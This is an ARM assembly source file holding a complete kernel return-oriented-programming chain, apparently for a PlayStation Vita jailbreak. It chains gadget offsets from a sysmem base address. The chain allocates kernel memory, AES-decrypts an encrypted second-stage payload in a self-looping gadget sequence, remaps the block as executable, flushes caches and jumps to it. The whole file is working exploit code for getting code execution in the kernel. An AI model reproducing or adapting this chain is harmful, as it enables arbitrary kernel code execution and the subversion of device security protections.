@ these are provided by build_rop.py
@ .equ ENC_PAYLOAD_ADDR, 0x810D0000
@ actual size (not including the 0x10 junk at the start). must be 0x10 aligned.
@ .equ ENC_PAYLOAD_SIZE, 0x00000080
@ .equ BASE, 0x81002000

.syntax unified

__payload_start:
allocate_code_memory:
  .word BASE+0x00000031 @ pop {r0, pc}
  .word      0x08106803 @ r0 = 0x8106803
  .word BASE+0x0001eff1 @ lsls r0, r0, #1 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0001efe1 @ movs r1, r0 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001b571 @ lsls r2, r0, #5 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001e43 @ and r2, r2, #0xf0000 @ cmp.w r2, #0x40000 @ beq #0x1e5c @ movs r0, #0 @ pop {r3, r4, r5, pc}
  .word      0x00000000 @ r3 = NULL
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r5 = dummy
  .word BASE+0x00000031 @ pop {r0, pc}
  .word BASE+0x00027913 @ r0 = "Magic"
  .word BASE+0x0000a523 @ ksceKernelAllocMemBlock(r0 = "Magic", r1 = 0x1020D006, r2 = 0xA0000, r3 = NULL) @ pop {r4,pc}
  .word      0xDEADBEEF @ r4 = dummy

get_memory_base:
  .word BASE+0x00000ce3 @ pop {r4, r5, r6, r7, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r5 = dummy
  .word      0xDEADBEEF @ r6 = dummy
  .word BASE+0x0000587f @ r7 = movs r2, r0 @ pop {r4, pc}
  .word BASE+0x00019713 @ add r3, sp, #0x28 @ blx r7
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00001e1d @ mov r0, r3 @ pop {r4, pc}
  .word      0x00000000 @ r4 = 0x0
  .word BASE+0x0001efe1 @ movs r1, r0 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001603 @ mov r0, r2 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001f17 @ 0xA841EDDA_getbase(r0 = blkid, r1 = base) @ pop {r3,pc}
  .word      0xDEADBEEF @ r3 = dummy

@ save base address to r7
save_base_addr:
  .word BASE+0x00000031 @ pop {r0, pc}
  .word      0xDEADBEEF @ r0 = base address (written to from above)
  .word BASE+0x00023b61 @ movs r7, r0 @ movt r0, #0x8002 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}

init_aes_engine:
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x000232eb @ movs r0, #8 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0001b571 @ lsls r2, r0, #5 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x000232f1 @ movs r0, #0x80 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00000ae1 @ movs r1, r0 @ bx lr
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x00001411 @ pop {r4, r5, pc}
  .word (ENC_PAYLOAD_SIZE>>2)+0x10 @ r4 = ctx buffer
  .word BASE+0x0001f2b1 @ r5 = eor sb, r0, #0x40 @ pop {r3, pc}
  .word BASE+0x00012b11 @ adds.w r0, r0, r4, lsl #2 @ beq #0x12ae6 @ add sp, #8 @ pop {r4, pc}
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word BASE+0x00000347 @ r4 = pop {pc}
  @ save ctx pointer to sb ^ 0x40
  .word BASE+0x0001f2b1 @ eor sb, r0, #0x40 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001fdc5 @ mov r3, lr @ blx r4
  .word BASE+0x0001d8db @ 0xF12B6451_aes_init(r0 = ctx, r1 = 128, r2 = 256, r3 = key) @ pop {r4, pc}
  .word      0xDEADBEEF @ r4 = dummy

@ save aes_ctx to r6. we need to undo the XOR
@ r5 = eor sb, r0, #0x40 @ pop {r3, pc}
save_ctx_pointer:
  .word BASE+0x00019399 @ mov r0, sb @ mov r1, r4 @ ldr r2, [sp, #8] @ movs r3, #0 @ blx r5
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00019399 @ mov r0, sb @ mov r1, r4 @ ldr r2, [sp, #8] @ movs r3, #0 @ blx r5
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x0000b913 @ movs r6, r0 @ add r0, r4 @ add r1, r2 @ cmp r0, r1 @ ite hi @ movhi r0, #0 @ movls r0, #1 @ add sp, #8 @ pop {r4, pc}
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ r4 = dummy

@ r3 = pop {pc}
@ save counter to sb, init to 0
init_decrypt_loop:
  .word BASE+0x00001861 @ movs r0, #0 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0001f2b1 @ eor sb, r0, #0x40 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}

@ r5 = eor sb, r0, #0x40 @ pop {r3, pc}
decrypt_loop_start:
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  @ first get counter (and unxor it)
  .word BASE+0x00019399 @ mov r0, sb @ mov r1, r4 @ ldr r2, [sp, #8] @ movs r3, #0 @ blx r5
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00019399 @ mov r0, sb @ mov r1, r4 @ ldr r2, [sp, #8] @ movs r3, #0 @ blx r5
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001614d @ adds r0, #0x10 ; bx lr
  .word      0xDEADBEEF @ r3 = dummy
  @ store incremented counter (and xor it)
  .word BASE+0x0001f2b1 @ eor sb, r0, #0x40 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x000000af @ rsbs r0, r0, #0 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
.Lget_offsets:
  .word BASE+0x0001efe1 @ movs r1, r0 @ pop {r3, pc}
  @ r1 now contains counter value
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x00001347 @ movs r2, r0 @ bx lr
  @ r2 now contains dst ptr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x000000b9 @ subs r0, r2, r1 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00001347 @ movs r2, r0 @ bx lr
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x0000039b @ pop {r4, pc}
  .word ENC_PAYLOAD_ADDR @ r4 = payload src addr
  .word BASE+0x0001cb95 @ subs r1, r4, r1 @ blx r3
  .word BASE+0x0001ea93 @ mov r0, r6 @ blx r3
.Ldecrypt:
  @ this is pretty complicated. the problem is that a call to 
  @ 0xD8678061_aes_decrypt overwrites part of the stack above it in order to 
  @ save caller registers. we need this because we use r6 and r7 for the counter
  @ and codemem base values.
  .word BASE+0x00001411 @ pop {r4, r5, pc}
  .word BASE+0x00000347 @ r4 = pop {pc}
  .word BASE+0x000209d7 @ r5 = str r5, [sp, #0x10] @ blx r4 @ add sp, #0x1c @ pop {r4, r5, pc}
  @ we need to restore the decrypt gadget. to do this we first have to restore 
  @ two helper gadgets thats also corrupted
  .word BASE+0x000209d3 @ str r5, [sp, #0xc] @ ldr r5, [sp, #0x38] @ str r5, [sp, #0x10] @ blx r4
  .word BASE+0x00001411 @ pop {r4, r5, pc}
  .word BASE+0x00000347 @ r4 = pop {pc}
  .word BASE+0x0001baf5 @ r5 = 0xD8678061_aes_decrypt

  @ BEGIN region overwritten by decrypt
  @ overwritten with r4
  .word      0xDEADBEEF @ becomes str r5, [sp, #0x10] @ blx r4 @ add sp, #0x1c @ pop {r4, r5, pc}
  @ lr = add sp, #0x1c @ pop {r4, r5, pc}
  @ overwritten with r5
  .word      0xDEADBEEF @ becomes add sp, #0xc @ pop {pc}
  @ overwritten with r6
  .word      0xDEADBEEF @ dummy
  @ overwritten with r7
  .word      0xDEADBEEF @ dummy
  @ overwritten with r8
  .word      0xDEADBEEF @ dummy
  @ overwritten with lr
  .word      0xDEADBEEF @ becomes 0xD8678061_aes_decrypt(r0 = ctx, r1 = src, r2 = dst) @ bx lr
  @ END region overwritten by decrypt

  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ dummy
  .word BASE+0x0000652b @ loaded by above: add sp, #0xc @ pop {pc}
  .word      0xDEADBEEF @ dummy
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r5 = dummy
.Lloop_condition:
  .word BASE+0x00001605 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x0001d9eb @ add r2, sp, #0xbc @ blx r3
.Lsp_offset_start:
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x00000853 @ pop {r0, r1, pc}
  .word      0xDEADBEEF @ r0 = dummy
  .word (0xbc - (.Lloop_end - .Lsp_offset_start)) @ r1 = 0xbc-sizeof(loop)
  .word BASE+0x000000ab @ subs r2, r2, r1 @ it ls @ rsbls r0, r0, #0 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0002328b @ movs r1, r2 @ pop {r4, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x000000d1 @ movs r4, r1 @ bx lr
  .word      0xDEADBEEF @ r3 = dummy
  @ now r4 is at .Lloop_end
  @ we need the counter again
  .word BASE+0x0002a117 @ pop {r2, r5, pc}
  .word      0xDEADBEEF @ r2 = dummy
  .word BASE+0x00001605 @ r5 = pop {r3, pc}
  .word BASE+0x00019399 @ mov r0, sb @ mov r1, r4 @ ldr r2, [sp, #8] @ movs r3, #0 @ blx r5
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001bf1f @ movs r2, r4 @ bx lr
  .word (-(.Lloop_end-decrypt_loop_start)) @ r3 = offset to start of loop
  .word BASE+0x0000039b @ pop {r4, pc}
  .word (ENC_PAYLOAD_SIZE ^ 0x40) @ r4 = (payload size) ^ 0x40
  .word BASE+0x00022a49 @ subs r0, r0, r4 @ pop {r4, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00003d73 @ ite ne @ movne r0, r3 @ moveq r0, #0 @ bx lr
  .word      0x00000000 @ r3 = 0
  @ add either 0 or offset to loop start to r2 (sp at loop end)
  .word BASE+0x000021fd @ add r0, r2 @ cmp r3, #0 @ bne #0x21ea @ pop {r4} @ bx lr
  .word      0xDEADBEEF @ r4 = dummy
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x00000ae1 @ movs r1, r0 @ bx lr
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x0002a117 @ pop {r2, r5, pc}
  .word BASE+0x00000347 @ r2 = pop {pc}
  .word BASE+0x0001f2b1 @ r5 = eor sb, r0, #0x40 @ pop {r3, pc}
  .word BASE+0x00000067 @ mov sp, r1 @ blx r2
.Lloop_end:

mark_executable:
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word BASE+0x0001bf47 @ movs r1, #0 @ bx lr
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x0000af33 @ ksceKernelFindMemBlockByAddr(r0 = base, r1 = 0); pop {r3, r4, r5, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word SECOND_PAYLOAD  @ r5 = dummy
  .word BASE+0x0001fc6d @ blx r3 @ pop {r4, pc}
  .word BASE+0x0000ea73 @ movs r3, r0 @ bx lr
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00000853 @ pop {r0, r1, pc}
  .word      0xffffffff @ r0 = 0xffffffff
  .word      0x08106803 @ r1 = 0x8106803
  .word BASE+0x000233d3 @ lsls r2, r1, #1 @ bx lr
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x00000433 @ subs r1, r2, #1 @ ands r0, r1 @ beq #0x450 @ clz r0, r0 @ sub.w r4, r3, r0, lsr #3 @ subs r0, r4, #1 @ pop {r4, pc}
  .word      0xDEADBEEF @ r4 = dummy
  .word BASE+0x000150a3 @ mov r0, r3 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3 = dummy
  .word BASE+0x0000a74d @ sysmem_remap(r0 = blk, r1 = 0x1020D005) @ bx lr
  .word BASE            @ r4 = sysmem base (arg to payload)

flush_caches:
  .word BASE+0x00000853 @ pop {r0, r1, pc}
  .word      0xDEADBEEF @ r0
  .word ENC_PAYLOAD_SIZE @ r1
  .word BASE+0x00001605 @ pop {r3, pc}
  .word BASE+0x00000347 @ r3 = pop {pc}
  .word BASE+0x000050e9 @ mov r0, r7 @ blx r3
  .word BASE+0x00001605 @ pop {r3, pc}
  .word BASE+0x00022fcd @ flush_cache(r0 = base, r1 = size)
  .word BASE+0x000039eb @ blx r3 @ pop {r3, pc}
  .word      0xDEADBEEF @ r3

execute_code:
  .word BASE+0x00011c5f @ blx r7
